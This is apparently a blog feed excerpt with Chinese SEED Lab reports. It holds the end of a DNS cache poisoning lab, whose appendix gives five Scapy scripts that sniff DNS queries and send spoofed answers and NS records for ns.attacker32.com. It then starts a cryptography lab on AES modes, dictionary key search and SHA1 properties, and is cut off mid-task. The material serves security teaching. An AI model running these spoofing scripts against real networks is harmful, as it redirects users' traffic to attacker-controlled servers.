section的三个条目均没有被成功缓存。</p><p>根据RFC1034中的实例以及对于query的介绍可以得知原因在于，additional section中应该补充回答的是在answer section和authority section中所出现的ns，而此处并没有出现<a href="http://www.facebook.com/">www.facebook.com</a> 因此其并未被写入，而由于在answer section 中已经回答了<a href="http://www.example.com/">www.example.com</a> 的IP为 5.5.5.5，所以 ns.examle.com 和 ns.attacker32.com 也并未被写入。</p><h2 id="五-附件"><a href="#五-附件" class="headerlink" title="五.附件"></a>五.附件</h2><p>Task1</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;www.example.net&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        pkt.show() <span class="comment"># print</span></span><br><span class="line">        <span class="comment"># Swap the source and destination IP address</span></span><br><span class="line">        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">        <span class="comment"># Swap the source and destination port number</span></span><br><span class="line">        UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line">        <span class="comment"># The Answer Section</span></span><br><span class="line">        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;1.1.1.1&#x27;</span>)</span><br><span class="line">        <span class="comment"># Construct the DNS packet</span></span><br><span class="line">        DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,</span><br><span class="line">                     qdcount=<span class="number">1</span>, ancount=<span class="number">1</span>, nscount=<span class="number">0</span>, arcount=<span class="number">0</span>,</span><br><span class="line">                     an=Anssec)</span><br><span class="line">        <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">        spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">        send(spoofpkt)</span><br><span class="line">        <span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">        f = <span class="string">&#x27;udp and src host 10.9.0.5 and dst port 53&#x27;</span></span><br><span class="line">        pkt = sniff(iface=<span class="string">&#x27;br-579a2284e98b&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns) </span><br></pre></td></tr></table></figure><p>Task2</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;www.example.net&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        pkt.show() <span class="comment"># print</span></span><br><span class="line">        <span class="comment"># Swap the source and destination IP address</span></span><br><span class="line">        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">        <span class="comment"># Swap the source and destination port number</span></span><br><span class="line">        UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line">        <span class="comment"># The Answer Section</span></span><br><span class="line">        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;2.2.2.2&#x27;</span>)</span><br><span class="line">        <span class="comment"># Construct the DNS packet</span></span><br><span class="line">        DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,</span><br><span class="line">                     qdcount=<span class="number">1</span>, ancount=<span class="number">1</span>, nscount=<span class="number">0</span>, arcount=<span class="number">0</span>,</span><br><span class="line">                     an=Anssec)</span><br><span class="line">        <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">        spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">        send(spoofpkt)</span><br><span class="line">        <span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">        f = <span class="string">&#x27;udp and src host 10.9.0.53 and dst port 53&#x27;</span></span><br><span class="line">        pkt = sniff(iface=<span class="string">&#x27;br-579a2284e98b&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns)</span><br></pre></td></tr></table></figure><p>Task3</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;www.example.com&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        pkt.show() <span class="comment"># print</span></span><br><span class="line">        <span class="comment"># Swap the source and destination IP address</span></span><br><span class="line">        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">        <span class="comment"># Swap the source and destination port number</span></span><br><span class="line">        UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line">        <span class="comment"># The Answer Section</span></span><br><span class="line">        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;3.3.3.3&#x27;</span>)</span><br><span class="line">        <span class="comment"># The Authority Section</span></span><br><span class="line">        NSsec1 = DNSRR(rrname=<span class="string">&#x27;example.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Construct the DNS packet</span></span><br><span class="line">        DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,</span><br><span class="line">                     qdcount=<span class="number">1</span>, ancount=<span class="number">1</span>, nscount=<span class="number">1</span>, arcount=<span class="number">0</span>,</span><br><span class="line">                     an=Anssec,ns=NSsec1)</span><br><span class="line">        <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">        spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">        send(spoofpkt)</span><br><span class="line">        <span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">        f = <span class="string">&#x27;udp and src host 10.9.0.53 and dst port 53&#x27;</span></span><br><span class="line">        pkt = sniff(iface=<span class="string">&#x27;br-579a2284e98b&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns) </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Task4</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;www.example.com&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        pkt.show() <span class="comment"># print</span></span><br><span class="line">        <span class="comment"># Swap the source and destination IP address</span></span><br><span class="line">        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">        <span class="comment"># Swap the source and destination port number</span></span><br><span class="line">        UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line">        <span class="comment"># The Answer Section</span></span><br><span class="line">        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;4.4.4.4&#x27;</span>)</span><br><span class="line">        <span class="comment"># The Authority Section</span></span><br><span class="line">        NSsec1 = DNSRR(rrname=<span class="string">&#x27;example.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        NSsec2 = DNSRR(rrname=<span class="string">&#x27;google.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line">        <span class="comment"># Construct the DNS packet</span></span><br><span class="line">        DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,</span><br><span class="line">                     qdcount=<span class="number">1</span>, ancount=<span class="number">1</span>, nscount=<span class="number">2</span>, arcount=<span class="number">0</span>,</span><br><span class="line">                     an=Anssec,ns=NSsec1/NSsec2)</span><br><span class="line">        <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">        spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">        send(spoofpkt)</span><br><span class="line">        spoofpkt.show() <span class="comment"># show spoof pkt</span></span><br><span class="line"><span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">f = <span class="string">&#x27;udp and src host 10.9.0.53 and dst port 53&#x27;</span></span><br><span class="line">pkt = sniff(iface=<span class="string">&#x27;br-579a2284e98b&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns) </span><br></pre></td></tr></table></figure><p>Task5</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;www.example.com&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        pkt.show() <span class="comment"># print</span></span><br><span class="line">        <span class="comment"># Swap the source and destination IP address</span></span><br><span class="line">        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">        <span class="comment"># Swap the source and destination port number</span></span><br><span class="line">        UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line">        <span class="comment"># The Answer Section</span></span><br><span class="line">        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;5.5.5.5&#x27;</span>)</span><br><span class="line">        <span class="comment"># The Authority Section</span></span><br><span class="line">        NSsec1 = DNSRR(rrname=<span class="string">&#x27;example.com.&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        NSsec2 = DNSRR(rrname=<span class="string">&#x27;example.com.&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.example.com&#x27;</span>)</span><br><span class="line">        <span class="comment"># The Additional Section</span></span><br><span class="line">        Addsec1 = DNSRR(rrname=<span class="string">&#x27;ns.attacker32.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                        ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;1.2.3.4&#x27;</span>)</span><br><span class="line">        Addsec2 = DNSRR(rrname=<span class="string">&#x27;ns.example.net&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                        ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;5.6.7.8&#x27;</span>)</span><br><span class="line">        Addsec3 = DNSRR(rrname=<span class="string">&#x27;www.facebook.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                        ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;3.4.5.6&#x27;</span>)</span><br><span class="line">        <span class="comment"># Construct the DNS packet</span></span><br><span class="line">        DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,</span><br><span class="line">                     qdcount=<span class="number">1</span>, ancount=<span class="number">1</span>, nscount=<span class="number">2</span>, arcount=<span class="number">3</span>,</span><br><span class="line">                     an=Anssec,ns=NSsec1/NSsec2,ar=Addsec1/Addsec2/Addsec3)</span><br><span class="line">        <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">        spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">        send(spoofpkt)</span><br><span class="line">        spoofpkt.show() <span class="comment"># show spoof pkt</span></span><br><span class="line"><span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">f = <span class="string">&#x27;udp and src host 10.9.0.53 and dst port 53&#x27;</span></span><br><span class="line">pkt = sniff(iface=<span class="string">&#x27;br-579a2284e98b&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns) </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seedlab2.0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto implementation Lab</title>
      <link href="/2022/11/29/crypto_implementation/"/>
      <url>/2022/11/29/crypto_implementation/</url>
      
        <content type="html"><![CDATA[<h2 id="一-实验目的"><a href="#一-实验目的" class="headerlink" title="一.实验目的"></a>一.实验目的</h2><p>本实验的学习目标是让学生熟悉密钥加密与单向散列函数相关的概念。完成实验后，学生应该能够获得有关加密算法、加密模式、单向散列函数的第一手经验。此外，学生将能够使用工具和编写程序来加密&#x2F;解密消息，为给定的消息生成单向散列值。</p><span id="more"></span><p>开发人员在使用加密算法和模式时会犯许多常见的错误。这些错误会削弱加密的强度，并最终导致出现漏洞。本实验向学生展示一些错误，并要求学生发起攻击以利用这些漏洞。</p><p>1. 密钥加密。</p><p>2. 加密模式、初始向量（IV）和填充（Padding）。</p><p>3. 使用加密算法的常见错误。</p><p>4. 使用密码库进行编程。</p><h2 id="二-实验步骤与结果"><a href="#二-实验步骤与结果" class="headerlink" title="二.实验步骤与结果"></a>二.实验步骤与结果</h2><h3 id="2-1-Task-1：使用不同的密码算法和加密模式加密"><a href="#2-1-Task-1：使用不同的密码算法和加密模式加密" class="headerlink" title="2.1 Task 1：使用不同的密码算法和加密模式加密"></a>2.1 Task 1：使用不同的密码算法和加密模式加密</h3><p>在此任务中，我们将使用各种加密算法和模式。你可以使用以下openssl enc 命令来加密&#x2F;解密文件。要查看手册，你可以输入man openssl 和man enc。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150940491.png"></p><p>请将ciphertype 替换为特定的加密算法，例如-aes-128-cbc，-aes-128-cfb，-bf-cbc 等。这个任务，你应该尝试至少3 种不同的加密算法和模式组合。</p><p>实验步骤：</p><p>使用AES-128-CBC加密，解密，并与原文对比：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150941137.png"></p><p>使用AES-128-CFB加密，解密，并与原文对比：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150943523.png"></p><p>使用AES-128-OFB加密，解密，并与原文对比：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150943413.png"></p><h3 id="2-2-Task-2：加密模式：ECB-vs-CBC"><a href="#2-2-Task-2：加密模式：ECB-vs-CBC" class="headerlink" title="2.2 Task 2：加密模式：ECB vs. CBC"></a>2.2 Task 2：加密模式：ECB vs. CBC</h3><p>文件pic_original.bmp 包含一个简单的图片。我们想加密这张图片，所以没有加密密钥的人无法知道图片中的内容。请分别使用ECB（电子密码本）和CBC（密码块链接）模式加密文件。比如，你可以使用</p><p>• CBC 模式：-aes-128-cbc</p><p>• ECB 模式：-aes-128-ecb</p><p>然后执行以下操作：</p><p>（1）让我们将加密的图片视为图片，并使用图片查看软件来显示它。但是，对于.bmp 文件，前54 个字节包含有关图片的头部信息，我们必须正确设置它，因此加密文件可以被视为合法的.bmp 文件。我们将加密图片的头部替换为原始图片的头部。你可以使用十六进制编辑器工具（例如Bless）直接修改二进制文件。我们还可以使用以下命令从p1.bmp 中获取header，从p2.bmp 中获取数据（从偏移量55 到文件末尾），然后将header 和数据组合到一个新文件中。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150944992.png"></p><p>（2）使用任意图片查看软件显示加密图片。在ECB 模式和CBC 模式下，你分别能得到关于加密图片的原始图片的任何有用的信息吗？请解释你的观察。</p><p>实验步骤：</p><p>采用ECB模式加密如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150944553.png"></p><p>加密后的图片如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150945908.png"></p><p>采用CBC模式加密如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150945326.png"></p><p>加密后的图片如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150945977.png"></p><p>通过与原图的对比可以得知，在ECB模式加密后，得到的加密图片仍然可以得到原来图片的轮廓与形状，而通过CBC模式加密后，得到的加密图片完全是乱码无法得到关于原始图片任何有用的信息。</p><p>原因在于CBC模式每一次加密要将前一次的加密结果与加密内容进行异或，因此每一部分的加密前后不是一一对应的，即相同的明文块不会得到相同的密文块。而ECB模式中，不需要异或，相同的明文块会对应相同的密文块，因此图片的形状和轮廓依旧会保留。</p><h3 id="2-3-Task-3：错误传播–-被破坏的密文"><a href="#2-3-Task-3：错误传播–-被破坏的密文" class="headerlink" title="2.3 Task 3：错误传播– 被破坏的密文"></a>2.3 Task 3：错误传播– 被破坏的密文</h3><p>为了理解各种工作模式的在错误传播上的性质，请做以下练习：</p><p>1. 创建一个至少1000 字节长的文本文件。</p><p>2. 使用AES-128 算法加密文件。</p><p>3. 不幸的是，加密文件中第55 个字节的某一个bit 已损坏。你可以使用bless 十六进制编辑器来破坏该文件。</p><p>4. 使用正确的密钥和IV 解密损坏的密文文件。</p><p>请回答以下问题：如果工作模式是ECB 或CBC ，你分别能从解密后的损坏文件中恢复出多少信息？</p><p>请在做这个任务之前回答这个问题，然后在完成此任务之后看看你的答案是否正确。给出你的理由。</p><blockquote><p>ECB模式将只有第四组解密错误<br>CBC模式将有第四组与第五组的解密错误</p></blockquote><p>实验步骤：</p><p>首先创建一个1000字节长的文本文件如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150948393.png"></p><p>采用ECB模式加密后得到如下文件：</p><p>其中第55字节为E1</p><p>对应二进制位1110 0001</p><p>修改为A1</p><p>对应二进制位1010 0001</p><p>然后再进行解密</p><p>如下图：</p><p>修改前：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150949685.png"></p><p>修改后：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150949796.png"></p><p>解密后：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150950216.png"></p><p>可以观察到只有第四轮的明文改变</p><p>CBC模式同理：</p><p>如下图：</p><p>修改前：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150950735.png"></p><p>修改后：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150950083.png"></p><p>解密结果：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150951870.png"></p><p>可以观察到第四轮的明文改变，以及第五轮的第七位发生改变</p><p>实验结果与预期结果相同</p><h3 id="2-4-Task-4：寻找密钥"><a href="#2-4-Task-4：寻找密钥" class="headerlink" title="2.4 Task 4：寻找密钥"></a>2.4 Task 4：寻找密钥</h3><p>你得到一个明文和一个密文，你知道aes-128-cbc 用于从明文生成密文。你得到的另一条线索是，加密此明文使用的密钥是一个少于16 个字符的英语单词。这个单词可以从英语字典中找到。由于这个单词少于16 个字符（即128 bits ）1，在单词的结尾附加了一些井号（#：十六进制值是0x23）构成一个128bits 的密钥。</p><p>你的目标是编写一个程序来找出这个密钥，你可以使用任意的编程语言（如Java、C、Shell）来实现你的分析。你也可以在程序中直接调用OpenSSL 命令来使用加密算法。你可以从Internet 下载英文单词列表，我们也提供了一个：words.txt。</p><p>明文、密文和IV 如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150952866.png"></p><p>实验步骤如下：</p><p>编写脚本如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150952399.png"></p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150953849.png"></p><p>执行该脚本，即可得到密钥如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150953495.png"></p><h3 id="2-5-Task-5：生成消息摘要"><a href="#2-5-Task-5：生成消息摘要" class="headerlink" title="2.5 Task 5：生成消息摘要"></a>2.5 Task 5：生成消息摘要</h3><p>在此任务中，我们将使用各种哈希算法。。你可以使用以下openssl dgst 命令生成文件的哈希值。</p><table><thead><tr><th>$ openssl dgst dgsttype filename</th></tr></thead></table><p>请使用特定的哈希算法替换dgsttype，例如-md5，-sha1，-sha256 等。在此任务中，你应该尝试至少3 种不同的算法，并描述你的观察。你可以通过键入“man dgst”找到支持的哈希算法。</p><p>我们提供了一个（明文）文本文件用作测试：plain.txt</p><p>步骤如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150953790.png"></p><p>分别使用md5，sha1，sha256进行加密，可以观察得到了不同长度的十六进制字符串。</p><h3 id="2-6-Task-6：哈希函数的输出特性"><a href="#2-6-Task-6：哈希函数的输出特性" class="headerlink" title="2.6 Task 6：哈希函数的输出特性"></a>2.6 Task 6：哈希函数的输出特性</h3><p>要了解哈希函数的输出特性，我们希望对SHA1 执行以下练习：</p><p>1. 使用SHA1 算法为plain.txt 生成哈希值H1。</p><p>2. 修改输入文件的一位。你可以使用Bless 来完成此修改。</p><p>3. 为修改后的文件生成哈希值H2。</p><p>请观察H1 和H2 是否相似。请在实验报告中描述你的观察结果。</p><p>实验步骤：</p><p>使用SHA1算法加密plain.txt后，得到结果如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150955724.png"></p><p>修改文件的内容中第一个字节中的第一个bit</p><p>初始为49，二进制为：0100 1001</p><p>修改后为C9，二进制为：1100 1001</p><p>如下图所示：</p><p>修改前：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150956539.png"></p><p>修改后：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150956032.png"></p><p>重新采用SHA1算法进行，加密得到结果如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150956766.png"></p><p>对比前后两次的哈希结果：</p><p>修改前：8d3b090efe42d1344c7d6d60a534a7f525e2b2e7</p><p>修改后：6711dd03a1332377c155d81f713b4ea78c306ebf</p><p>可以发现两次的结果只有长度相同，在内容上完全不同，没有任何关联。由于任何一比特的改变都使得了输出结果的不同，保证了哈希算法的抗碰撞特性。</p><h3 id="2-7-Task-7：单向性与抗碰撞性"><a href="#2-7-Task-7：单向性与抗碰撞性" class="headerlink" title="2.7 Task 7：单向性与抗碰撞性"></a>2.7 Task 7：单向性与抗碰撞性</h3><p>哈希函数的具有单向性与抗碰撞性。在这个实验里我们将使用暴力穷举方法来测试抗碰撞性，即找到具有相同哈希值的两个文件。你的目标是，在给定一个文件，编写一个程序来找出另一个具有相同哈希值的文件，你可以使用任意的编程语言（如Java、C、Shell）来实现你的分析。你可以在程序中直接调用OpenSSL 命令来使用哈希算法。</p><p>由于大多数哈希函数的抗碰撞性的抵御暴力攻击的能力非常强大，因此使用暴力穷举方法攻破它们需要数年时间。为了使任务可行，我们将哈希值的长度减少到24 位。我们在此任务中只使用SHA1 哈希值的前24 位。即，可以理解成我们使用修改过的单向散列函数。请设计一个程序，找出以下内容：</p><p>1. 计算original.txt 的SHA1 哈希值，并记录前24 位。</p><p>2. 